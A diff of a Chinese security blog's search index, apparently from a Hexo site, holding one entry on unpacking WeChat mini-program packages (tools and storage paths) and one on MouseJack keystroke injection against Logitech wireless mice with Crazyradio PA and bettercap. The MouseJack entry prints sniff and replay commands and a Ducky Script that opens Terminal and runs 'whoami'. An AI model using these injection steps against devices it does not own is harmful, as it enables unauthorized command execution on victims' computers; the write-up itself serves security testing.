@@ -1,6 +1,26 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>小程序安全测试--微信（1）</title>
+    <url>/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
+</code></pre>
+<span id="more"></span>    
+
+<p>app端解包<br>python (<a href="https://github.com/leo9960/wechat-app-unpack">https://github.com/leo9960/wechat-app-unpack</a>)<br>nodejs 也有编译好的客户端 (<a href="https://github.com/xuedingmiaojun/mp-unpack">https://github.com/xuedingmiaojun/mp-unpack</a>)</p>
+<p>pc端解包<br>pc端可能带加密，所以需要先转码<br>(<a href="https://github.com/maotoumao/wxpc-miniprogram-decryption">https://github.com/maotoumao/wxpc-miniprogram-decryption</a>)<br>原理：<br>(<a href="https://juejin.cn/post/6888348237242040327">https://juejin.cn/post/6888348237242040327</a>)<br>(<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a>)</p>
+<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>Android：<br>/data/data/com.tencent.mm/MicroMsg/32位长文件/appbrand/pkg</p>
+<p>IOS：<br>/var/mobile/Containers/Data/Application/{程序UUID}/Library/WechatPrivate/{用户ID}/WeApp/LocalCache/release/{小程序ID}/</p>
+<p>mac路径：</p>
+<p>~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/817f39087ae1fbf97dc81798419249c7/WeApp/LocalCache/release/wx3ba512d53df66a75/4/Module<br><img src="/images/mac%E8%B7%AF%E5%BE%84.png"></p>
+<p>以某球影城为例：<br>从Android复制过来4个包，一个主文件，三个子文件<br><img src="/images/%E8%A7%A3%E5%8C%85.jpg"></p>
+<p>案列一：</p>
+]]></content>
+      <categories>
+        <category>小程序</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Crazyradio PA---罗技 鼠标劫持</title>
     <url>/2021/09/24/Crazyradio%20PA---%E7%BD%97%E6%8A%80%20%E9%BC%A0%E6%A0%87%E5%8A%AB%E6%8C%81/</url>
     <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>  <a href="https://www.bettercap.org/modules/hid/">https://www.bettercap.org/modules/hid/</a><br>  <a href="https://github.com/BastilleResearch/nrf-research-firmware">https://github.com/BastilleResearch/nrf-research-firmware</a><br>  <a href="https://github.com/hak5darren">https://github.com/hak5darren</a></p>
@@ -21,7 +41,7 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
 <p>  对特定地址进行嗅探<br>  capture.log 为固定输出文件名 </p>
 <p>  sudo ./nrf24-sniffer.py -a 0D:6C:90:B4:A4 -o capture.log<br>  sudo ./nrf24-static-channel-replay -a 0D:6C:90:B4:A4</p>
 <p>  即可重放log里的数据</p>
-<h1 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h1><p>  duck.txt编写<br>  调用terminal 执行whoami<br>对于mac：<br>  GUI SPACE<br>  DELAY 1000<br>  STRING Terminal<br>  DELAY 2000<br>  ENTER<br>  DELAY 1000<br>  STRING  whoami<br>  DELAY 1000<br>  ENTER<br>  ESC<br>利用bettercap进行注入<br>hid.recon on 开启 crazy<br>hid.inject 0d:6c:90:b4:a4 US /home/iot/Desktop/mouse/mousejack_transmit/duck.txt<br>  <img src="/images/mouse/b1.png" alt="bettercap"></p>
+<h1 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h1><p>  duck.txt编写<br>  调用terminal 执行whoami<br>  参考链接：<a href="https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language">https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language</a><br>  <a href="https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow">https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow</a><br>对于mac：<br>  GUI SPACE<br>  DELAY 1000<br>  STRING Terminal<br>  DELAY 2000<br>  ENTER<br>  DELAY 1000<br>  STRING  whoami<br>  DELAY 1000<br>  ENTER<br>  ESC<br>利用bettercap进行注入<br>hid.recon on 开启 crazy<br>hid.inject 0d:6c:90:b4:a4 US /home/iot/Desktop/mouse/mousejack_transmit/duck.txt<br>  <img src="/images/mouse/b1.png" alt="bettercap"></p>
 <p><img src="/images/mouse/b2.png" alt="调用termnial"></p>
 ]]></content>
       <categories>
@@ -48,26 +68,6 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
 ]]></content>
       <categories>
         <category>MacOS</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>小程序安全测试--微信（1）</title>
-    <url>/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
-</code></pre>
-<span id="more"></span>    
-
-<p>app端解包<br>python (<a href="https://github.com/leo9960/wechat-app-unpack">https://github.com/leo9960/wechat-app-unpack</a>)<br>nodejs 也有编译好的客户端 (<a href="https://github.com/xuedingmiaojun/mp-unpack">https://github.com/xuedingmiaojun/mp-unpack</a>)</p>
-<p>pc端解包<br>pc端可能带加密，所以需要先转码<br>(<a href="https://github.com/maotoumao/wxpc-miniprogram-decryption">https://github.com/maotoumao/wxpc-miniprogram-decryption</a>)<br>原理：<br>(<a href="https://juejin.cn/post/6888348237242040327">https://juejin.cn/post/6888348237242040327</a>)<br>(<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a>)</p>
-<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>Android：<br>/data/data/com.tencent.mm/MicroMsg/32位长文件/appbrand/pkg</p>
-<p>IOS：<br>/var/mobile/Containers/Data/Application/{程序UUID}/Library/WechatPrivate/{用户ID}/WeApp/LocalCache/release/{小程序ID}/</p>
-<p>mac路径：</p>
-<p>~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/817f39087ae1fbf97dc81798419249c7/WeApp/LocalCache/release/wx3ba512d53df66a75/4/Module<br><img src="/images/mac%E8%B7%AF%E5%BE%84.png"></p>
-<p>以某球影城为例：<br>从Android复制过来4个包，一个主文件，三个子文件<br><img src="/images/%E8%A7%A3%E5%8C%85.jpg"></p>
-<p>案列一：</p>
-]]></content>
-      <categories>
-        <category>小程序</category>
       </categories>
   </entry>
 </search>
